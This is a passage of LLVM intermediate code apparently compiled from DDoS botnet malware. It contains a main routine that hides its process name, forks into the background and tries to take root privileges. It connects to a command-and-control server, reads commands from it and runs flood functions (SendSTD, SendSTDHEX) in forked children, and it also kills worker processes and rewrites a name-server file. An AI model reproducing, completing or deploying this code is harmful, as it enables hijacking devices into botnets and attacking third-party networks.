.loopexit129:                                     ; preds = %.loopexit129.loopexit, %.loopexit131
  %142 = phi i8* [ %.pre144, %.loopexit129.loopexit ], [ %90, %.loopexit131 ]
  %143 = tail call i32 @strcmp(i8* %142, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i64 0, i64 0)) #14
  %144 = icmp eq i32 %143, 0
  br i1 %144, label %145, label %.loopexit127

; <label>:145:                                    ; preds = %.loopexit129
  %146 = icmp slt i32 %0, 4
  br i1 %146, label %231, label %147

; <label>:147:                                    ; preds = %145
  %148 = getelementptr inbounds i8*, i8** %1, i64 2
  %149 = load i8*, i8** %148, align 8
  %150 = tail call i32 @atoi(i8* %149) #14
  %151 = icmp slt i32 %150, 1
  br i1 %151, label %231, label %152

; <label>:152:                                    ; preds = %147
  %153 = getelementptr inbounds i8*, i8** %1, i64 3
  %154 = load i8*, i8** %153, align 8
  %155 = tail call i32 @atoi(i8* %154) #14
  %156 = icmp slt i32 %155, 1
  br i1 %156, label %231, label %157

; <label>:157:                                    ; preds = %152
  %158 = getelementptr inbounds i8*, i8** %1, i64 1
  %159 = load i8*, i8** %158, align 8
  %strchr119 = tail call i8* @strchr(i8* %159, i32 44)
  %160 = icmp eq i8* %strchr119, null
  br i1 %160, label %167, label %.preheader126.preheader

.preheader126.preheader:                          ; preds = %157
  br label %.preheader126

.preheader126:                                    ; preds = %.preheader126.preheader, %163
  %.sink122 = phi i8* [ null, %163 ], [ %159, %.preheader126.preheader ]
  %161 = tail call i8* @strtok(i8* %.sink122, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i64 0, i64 0)) #7
  %162 = icmp eq i8* %161, null
  br i1 %162, label %.loopexit127.loopexit, label %163

; <label>:163:                                    ; preds = %.preheader126
  %164 = tail call i32 @listFork()
  %165 = icmp eq i32 %164, 0
  br i1 %165, label %166, label %.preheader126

; <label>:166:                                    ; preds = %163
  tail call void @SendSTD(i8* nonnull %161, i32 %150, i32 %155)
  unreachable

; <label>:167:                                    ; preds = %157
  %168 = tail call i32 @listFork()
  %169 = icmp eq i32 %168, 0
  br i1 %169, label %170, label %231

; <label>:170:                                    ; preds = %167
  tail call void @SendSTD(i8* %159, i32 %150, i32 %155)
  unreachable

.loopexit127.loopexit:                            ; preds = %.preheader126
  %.pre145 = load i8*, i8** %1, align 8
  br label %.loopexit127

.loopexit127:                                     ; preds = %.loopexit127.loopexit, %.loopexit129
  %171 = phi i8* [ %.pre145, %.loopexit127.loopexit ], [ %142, %.loopexit129 ]
  %172 = tail call i32 @strcmp(i8* %171, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.116, i64 0, i64 0)) #14
  %173 = icmp eq i32 %172, 0
  br i1 %173, label %174, label %.loopexit125

; <label>:174:                                    ; preds = %.loopexit127
  %175 = icmp slt i32 %0, 4
  br i1 %175, label %231, label %176

; <label>:176:                                    ; preds = %174
  %177 = getelementptr inbounds i8*, i8** %1, i64 2
  %178 = load i8*, i8** %177, align 8
  %179 = tail call i32 @atoi(i8* %178) #14
  %180 = icmp slt i32 %179, 1
  br i1 %180, label %231, label %181

; <label>:181:                                    ; preds = %176
  %182 = getelementptr inbounds i8*, i8** %1, i64 3
  %183 = load i8*, i8** %182, align 8
  %184 = tail call i32 @atoi(i8* %183) #14
  %185 = icmp slt i32 %184, 1
  br i1 %185, label %231, label %186

; <label>:186:                                    ; preds = %181
  %187 = getelementptr inbounds i8*, i8** %1, i64 1
  %188 = load i8*, i8** %187, align 8
  %strchr120 = tail call i8* @strchr(i8* %188, i32 44)
  %189 = icmp eq i8* %strchr120, null
  br i1 %189, label %196, label %.preheader124.preheader

.preheader124.preheader:                          ; preds = %186
  br label %.preheader124

.preheader124:                                    ; preds = %.preheader124.preheader, %192
  %.sink123 = phi i8* [ null, %192 ], [ %188, %.preheader124.preheader ]
  %190 = tail call i8* @strtok(i8* %.sink123, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i64 0, i64 0)) #7
  %191 = icmp eq i8* %190, null
  br i1 %191, label %.loopexit125.loopexit, label %192

; <label>:192:                                    ; preds = %.preheader124
  %193 = tail call i32 @listFork()
  %194 = icmp eq i32 %193, 0
  br i1 %194, label %195, label %.preheader124

; <label>:195:                                    ; preds = %192
  tail call void @SendSTDHEX(i8* nonnull %190, i32 %179, i32 %184)
  unreachable

; <label>:196:                                    ; preds = %186
  %197 = tail call i32 @listFork()
  %198 = icmp eq i32 %197, 0
  br i1 %198, label %199, label %231

; <label>:199:                                    ; preds = %196
  tail call void @SendSTDHEX(i8* %188, i32 %179, i32 %184)
  unreachable

.loopexit125.loopexit:                            ; preds = %.preheader124
  %.pre146 = load i8*, i8** %1, align 8
  br label %.loopexit125

.loopexit125:                                     ; preds = %.loopexit125.loopexit, %.loopexit127
  %200 = phi i8* [ %.pre146, %.loopexit125.loopexit ], [ %171, %.loopexit127 ]
  %201 = tail call i32 @strcmp(i8* %200, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i64 0, i64 0)) #14
  %202 = icmp eq i32 %201, 0
  %203 = load i64, i64* @numpids, align 8
  %204 = icmp ne i64 %203, 0
  %or.cond139 = and i1 %202, %204
  br i1 %or.cond139, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit125
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %217
  %.0137 = phi i64 [ %218, %217 ], [ 0, %.lr.ph.preheader ]
  %205 = load i32*, i32** @pids, align 8
  %206 = getelementptr inbounds i32, i32* %205, i64 %.0137
  %207 = load i32, i32* %206, align 4
  %208 = icmp eq i32 %207, 0
  br i1 %208, label %217, label %209

; <label>:209:                                    ; preds = %.lr.ph
  %210 = tail call i32 @getpid() #7
  %211 = icmp eq i32 %207, %210
  br i1 %211, label %217, label %212

; <label>:212:                                    ; preds = %209
  %213 = load i32*, i32** @pids, align 8
  %214 = getelementptr inbounds i32, i32* %213, i64 %.0137
  %215 = load i32, i32* %214, align 4
  %216 = tail call i32 @kill(i32 %215, i32 9) #7
  br label %217

; <label>:217:                                    ; preds = %209, %.lr.ph, %212
  %218 = add i64 %.0137, 1
  %219 = load i64, i64* @numpids, align 8
  %220 = icmp ult i64 %218, %219
  br i1 %220, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %217
  %.pre147 = load i8*, i8** %1, align 8
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit125
  %221 = phi i8* [ %.pre147, %.loopexit.loopexit ], [ %200, %.loopexit125 ]
  %222 = tail call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.118, i64 0, i64 0)) #14
  %223 = icmp eq i32 %222, 0
  br i1 %223, label %224, label %225

; <label>:224:                                    ; preds = %.loopexit
  tail call void @exit(i32 0) #16
  unreachable

; <label>:225:                                    ; preds = %.loopexit
  %226 = tail call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.119, i64 0, i64 0)) #14
  %227 = icmp eq i32 %226, 0
  br i1 %227, label %228, label %231

; <label>:228:                                    ; preds = %225
  tail call void @RemoveTempDirs()
  %229 = load i32, i32* @mainCommSock, align 4
  %230 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %229, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.120, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i32 ptrtoint ([14 x i8]* @.str.124 to i32))
  br label %231

; <label>:231:                                    ; preds = %225, %196, %167, %138, %86, %21, %2, %174, %176, %181, %145, %147, %152, %93, %95, %100, %105, %112, %42, %44, %49, %54, %62, %9, %11, %16, %228
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @getEndianness() local_unnamed_addr #0 {
  ret i32 ptrtoint ([14 x i8]* @.str.124 to i32)
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [512 x i8], align 16
  %2 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 512, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #7
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #7
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #14
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #14
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 23, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() local_unnamed_addr #1 {
  %1 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.121, i64 0, i64 0), i32 513) #7
  %2 = tail call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.121, i64 0, i64 0), i32 0) #7
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %8, label %4

; <label>:4:                                      ; preds = %0
  %5 = and i32 %1, 65535
  %6 = tail call i64 @write(i32 %5, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.122, i64 0, i64 0), i64 38) #7
  %7 = tail call i32 @close(i32 %5) #7
  br label %8

; <label>:8:                                      ; preds = %0, %4
  ret void
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @access(i8* nocapture readonly, i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #1 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [10 x i8*], align 16
  %6 = load i8*, i8** %1, align 8
  %7 = tail call i64 @strlen(i8* %6) #14
  tail call void @llvm.memset.p0i8.i64(i8* %6, i8 0, i64 %7, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i64 0, i64 0), i8** %1, align 8
  %8 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.128 to i64), i32 0, i32 0, i32 0) #7
  %9 = tail call i64 @time(i64* null) #7
  %10 = tail call i32 @getpid() #7
  %11 = zext i32 %10 to i64
  %12 = xor i64 %11, %9
  %13 = trunc i64 %12 to i32
  tail call void @srand(i32 %13) #7
  %14 = tail call i64 @time(i64* null) #7
  %15 = tail call i32 @getpid() #7
  %16 = zext i32 %15 to i64
  %17 = xor i64 %16, %14
  %18 = trunc i64 %17 to i32
  tail call void @init_rand(i32 %18)
  %19 = tail call i32 @fork() #7
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %23, label %21

; <label>:21:                                     ; preds = %2
  %22 = call i32 @waitpid(i32 %19, i32* nonnull %3, i32 0) #7
  call void @exit(i32 0) #16
  unreachable

; <label>:23:                                     ; preds = %2
  %24 = tail call i32 @fork() #7
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %27, label %26

; <label>:26:                                     ; preds = %23
  tail call void @exit(i32 0) #16
  unreachable

; <label>:27:                                     ; preds = %23
  %28 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i64 0, i64 0)) #7
  %29 = tail call i32 @setuid(i32 0) #7
  %30 = tail call i32 @seteuid(i32 0) #7
  %31 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %32 = tail call i32 @fork() #7
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %.lr.ph107.preheader, label %.loopexit78

.lr.ph107.preheader:                              ; preds = %27
  br label %.lr.ph107

.lr.ph107:                                        ; preds = %.lr.ph107.preheader, %36
  %34 = tail call i32 @initConnection()
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %40, label %36

; <label>:36:                                     ; preds = %.lr.ph107
  %37 = tail call i32 @sleep(i32 5) #7
  %38 = tail call i32 @fork() #7
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %.lr.ph107, label %.loopexit78.loopexit126

; <label>:40:                                     ; preds = %.lr.ph107
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %41, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.130, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i32 ptrtoint ([14 x i8]* @.str.124 to i32))
  tail call void @UpdateNameSrvs()
  %43 = load i32, i32* @mainCommSock, align 4
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %45 = call i32 @recvLine(i32 %43, i8* nonnull %44, i32 4096)
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %.loopexit78, label %.preheader77.lr.ph

.preheader77.lr.ph:                               ; preds = %40
  %47 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %48 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 0
  br label %.preheader77

.preheader77:                                     ; preds = %.preheader77.lr.ph, %.backedge
  %49 = phi i32 [ %45, %.preheader77.lr.ph ], [ %96, %.backedge ]
  %50 = load i64, i64* @numpids, align 8
  %51 = icmp eq i64 %50, 0
  br i1 %51, label %._crit_edge93, label %.lr.ph92.preheader

.lr.ph92.preheader:                               ; preds = %.preheader77
  br label %.lr.ph92

.lr.ph92:                                         ; preds = %.lr.ph92.preheader, %.lr.ph92._crit_edge
  %indvars.iv = phi i64 [ %57, %.lr.ph92._crit_edge ], [ 0, %.lr.ph92.preheader ]
  %52 = load i32*, i32** @pids, align 8
  %53 = getelementptr inbounds i32, i32* %52, i64 %indvars.iv
  %54 = load i32, i32* %53, align 4
  %55 = call i32 @waitpid(i32 %54, i32* null, i32 1) #7
  %56 = icmp sgt i32 %55, 0
  %57 = add nuw i64 %indvars.iv, 1
  br i1 %56, label %.preheader, label %.lr.ph92._crit_edge

.preheader:                                       ; preds = %.lr.ph92
  %58 = load i64, i64* @numpids, align 8
  %59 = icmp ult i64 %57, %58
  %60 = load i32*, i32** @pids, align 8
  %61 = trunc i64 %indvars.iv to i32
  br i1 %59, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %62 = trunc i64 %57 to i32
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %63 = phi i32* [ %72, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %64 = phi i64 [ %69, %.lr.ph ], [ %57, %.lr.ph.preheader ]
  %.06584 = phi i32 [ %.065, %.lr.ph ], [ %62, %.lr.ph.preheader ]
  %.065.in83 = phi i32 [ %.06584, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %65 = getelementptr inbounds i32, i32* %63, i64 %64
  %66 = load i32, i32* %65, align 4
  %67 = zext i32 %.065.in83 to i64
  %68 = getelementptr inbounds i32, i32* %63, i64 %67
  store i32 %66, i32* %68, align 4
  %.065 = add i32 %.06584, 1
  %69 = zext i32 %.065 to i64
  %70 = load i64, i64* @numpids, align 8
  %71 = icmp ult i64 %69, %70
  %72 = load i32*, i32** @pids, align 8
  br i1 %71, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.065.in.lcssa = phi i32 [ %61, %.preheader ], [ %.06584, %._crit_edge.loopexit ]
  %.lcssa = phi i32* [ %60, %.preheader ], [ %72, %._crit_edge.loopexit ]
  %73 = zext i32 %.065.in.lcssa to i64
  %74 = getelementptr inbounds i32, i32* %.lcssa, i64 %73
  store i32 0, i32* %74, align 4
  %75 = load i64, i64* @numpids, align 8
  %76 = add i64 %75, -1
  store i64 %76, i64* @numpids, align 8
  %77 = shl i64 %75, 2
  %78 = call noalias i8* @malloc(i64 %77) #7
  %79 = bitcast i8* %78 to i32*
  %80 = icmp eq i64 %76, 0
  %81 = load i32*, i32** @pids, align 8
  br i1 %80, label %._crit_edge89, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %._crit_edge
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88.preheader, %.lr.ph88
  %82 = phi i64 [ %87, %.lr.ph88 ], [ 0, %.lr.ph88.preheader ]
  %.16686 = phi i32 [ %86, %.lr.ph88 ], [ 0, %.lr.ph88.preheader ]
  %83 = getelementptr inbounds i32, i32* %81, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = getelementptr inbounds i32, i32* %79, i64 %82
  store i32 %84, i32* %85, align 4
  %86 = add i32 %.16686, 1
  %87 = zext i32 %86 to i64
  %88 = icmp ult i64 %87, %76
  br i1 %88, label %.lr.ph88, label %._crit_edge89.loopexit

._crit_edge89.loopexit:                           ; preds = %.lr.ph88
  br label %._crit_edge89

._crit_edge89:                                    ; preds = %._crit_edge89.loopexit, %._crit_edge
  %89 = bitcast i32* %81 to i8*
  call void @free(i8* %89) #7
  store i8* %78, i8** bitcast (i32** @pids to i8**), align 8
  br label %.lr.ph92._crit_edge

.lr.ph92._crit_edge:                              ; preds = %.lr.ph92, %._crit_edge89
  %sext = shl i64 %57, 32
  %90 = ashr exact i64 %sext, 32
  %91 = load i64, i64* @numpids, align 8
  %92 = icmp ult i64 %90, %91
  br i1 %92, label %.lr.ph92, label %._crit_edge93.loopexit

._crit_edge93.loopexit:                           ; preds = %.lr.ph92._crit_edge
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %._crit_edge93.loopexit, %.preheader77
  %93 = sext i32 %49 to i64
  %94 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %93
  store i8 0, i8* %94, align 1
  call void @trim(i8* nonnull %44)
  %strncmp = call i32 @strncmp(i8* nonnull %44, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %.backedge, label %98

.backedge.loopexit:                               ; preds = %.lr.ph105
  br label %.backedge

.backedge.loopexit125:                            ; preds = %.preheader108
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit125, %.backedge.loopexit, %._crit_edge102.thread, %._crit_edge93, %._crit_edge102, %100
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 @recvLine(i32 %95, i8* nonnull %44, i32 4096)
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %.loopexit78.loopexit, label %.preheader77

; <label>:98:                                     ; preds = %._crit_edge93
  %strncmp69 = call i32 @strncmp(i8* nonnull %44, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.131, i64 0, i64 0), i64 3)
  %cmp70 = icmp eq i32 %strncmp69, 0
  br i1 %cmp70, label %99, label %100

; <label>:99:                                     ; preds = %98
  call void @exit(i32 0) #16
  unreachable

; <label>:100:                                    ; preds = %98
  %101 = load i8, i8* %44, align 16
  %102 = icmp eq i8 %101, 33
  br i1 %102, label %.preheader108.preheader, label %.backedge

.preheader108.preheader:                          ; preds = %100
  br label %.preheader108

.preheader108:                                    ; preds = %.preheader108.preheader, %104
  %.063 = phi i8* [ %105, %104 ], [ %47, %.preheader108.preheader ]
  %103 = load i8, i8* %.063, align 1
  switch i8 %103, label %104 [
    i8 0, label %.backedge.loopexit125
    i8 32, label %106
  ]

; <label>:104:                                    ; preds = %.preheader108
  %105 = getelementptr inbounds i8, i8* %.063, i64 1
  br label %.preheader108

; <label>:106:                                    ; preds = %.preheader108
  store i8 0, i8* %.063, align 1
  %107 = call i64 @strlen(i8* %47) #14
  %108 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %107
  %109 = getelementptr inbounds i8, i8* %108, i64 2
  br label %110

; <label>:110:                                    ; preds = %115, %106
  %111 = call i64 @strlen(i8* %109) #14
  %112 = add i64 %111, -1
  %113 = getelementptr inbounds i8, i8* %109, i64 %112
  %114 = load i8, i8* %113, align 1
  switch i8 %114, label %.preheader75.preheader [
    i8 13, label %115
    i8 10, label %115
  ]

.preheader75.preheader:                           ; preds = %110
  br label %.preheader75

; <label>:115:                                    ; preds = %110, %110
  store i8 0, i8* %113, align 1
  br label %110

.preheader75:                                     ; preds = %.preheader75.preheader, %117
  %.064 = phi i8* [ %118, %117 ], [ %109, %.preheader75.preheader ]
  %116 = load i8, i8* %.064, align 1
  switch i8 %116, label %117 [
    i8 32, label %119
    i8 0, label %119
  ]

; <label>:117:                                    ; preds = %.preheader75
  %118 = getelementptr inbounds i8, i8* %.064, i64 1
  br label %.preheader75

; <label>:119:                                    ; preds = %.preheader75, %.preheader75
  store i8 0, i8* %.064, align 1
  %120 = getelementptr inbounds i8, i8* %.064, i64 1
  %121 = load i8, i8* %109, align 1
  %122 = icmp eq i8 %121, 0
  br i1 %122, label %._crit_edge97, label %.lr.ph96.preheader

.lr.ph96.preheader:                               ; preds = %119
  br label %.lr.ph96

.lr.ph96:                                         ; preds = %.lr.ph96.preheader, %.lr.ph96
  %123 = phi i8 [ %128, %.lr.ph96 ], [ %121, %.lr.ph96.preheader ]
  %.06294 = phi i8* [ %127, %.lr.ph96 ], [ %109, %.lr.ph96.preheader ]
  %124 = zext i8 %123 to i32
  %125 = call i32 @toupper(i32 %124) #14
  %126 = trunc i32 %125 to i8
  store i8 %126, i8* %.06294, align 1
  %127 = getelementptr inbounds i8, i8* %.06294, i64 1
  %128 = load i8, i8* %127, align 1
  %129 = icmp eq i8 %128, 0
  br i1 %129, label %._crit_edge97.loopexit, label %.lr.ph96

._crit_edge97.loopexit:                           ; preds = %.lr.ph96
  br label %._crit_edge97

._crit_edge97:                                    ; preds = %._crit_edge97.loopexit, %119
  %130 = call i8* @strtok(i8* %120, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i64 0, i64 0)) #7
  store i8* %109, i8** %48, align 16
  %131 = icmp eq i8* %130, null
  br i1 %131, label %._crit_edge102.thread, label %.lr.ph101.preheader

.lr.ph101.preheader:                              ; preds = %._crit_edge97
  br label %.lr.ph101

._crit_edge102.thread:                            ; preds = %._crit_edge97
  call void @processCmd(i32 1, i8** nonnull %48)
  br label %.backedge

.lr.ph101:                                        ; preds = %.lr.ph101.preheader, %144
  %.06099 = phi i8* [ %145, %144 ], [ %130, %.lr.ph101.preheader ]
  %.06198 = phi i32 [ %.1, %144 ], [ 1, %.lr.ph101.preheader ]
  %132 = load i8, i8* %.06099, align 1
  %133 = icmp eq i8 %132, 10
  br i1 %133, label %144, label %134

; <label>:134:                                    ; preds = %.lr.ph101
  %135 = call i64 @strlen(i8* nonnull %.06099) #14
  %136 = add i64 %135, 1
  %137 = call noalias i8* @malloc(i64 %136) #7
  %138 = sext i32 %.06198 to i64
  %139 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %138
  store i8* %137, i8** %139, align 8
  %140 = call i64 @strlen(i8* nonnull %.06099) #14
  %141 = add i64 %140, 1
  call void @llvm.memset.p0i8.i64(i8* %137, i8 0, i64 %141, i32 1, i1 false)
  %142 = call i8* @strcpy(i8* %137, i8* nonnull %.06099) #7
  %143 = add nsw i32 %.06198, 1
  br label %144

; <label>:144:                                    ; preds = %.lr.ph101, %134
  %.1 = phi i32 [ %143, %134 ], [ %.06198, %.lr.ph101 ]
  %145 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i64 0, i64 0)) #7
  %146 = icmp eq i8* %145, null
  br i1 %146, label %._crit_edge102, label %.lr.ph101

._crit_edge102:                                   ; preds = %144
  call void @processCmd(i32 %.1, i8** nonnull %48)
  %147 = icmp sgt i32 %.1, 1
  br i1 %147, label %.lr.ph105.preheader, label %.backedge

.lr.ph105.preheader:                              ; preds = %._crit_edge102
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph105

.lr.ph105:                                        ; preds = %.lr.ph105.preheader, %.lr.ph105
  %indvars.iv115 = phi i64 [ %indvars.iv.next116, %.lr.ph105 ], [ 1, %.lr.ph105.preheader ]
  %148 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %indvars.iv115
  %149 = load i8*, i8** %148, align 8
  call void @free(i8* %149) #7
  %indvars.iv.next116 = add nuw nsw i64 %indvars.iv115, 1
  %exitcond = icmp eq i64 %indvars.iv.next116, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph105

.loopexit78.loopexit:                             ; preds = %.backedge
  br label %.loopexit78

.loopexit78.loopexit126:                          ; preds = %36
  br label %.loopexit78

.loopexit78:                                      ; preds = %.loopexit78.loopexit126, %.loopexit78.loopexit, %27, %40
  ret i32 0
}

declare i32 @prctl(...) local_unnamed_addr #2

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setuid(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @seteuid(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

declare i32 @sleep(i32) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #14

attributes #0 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
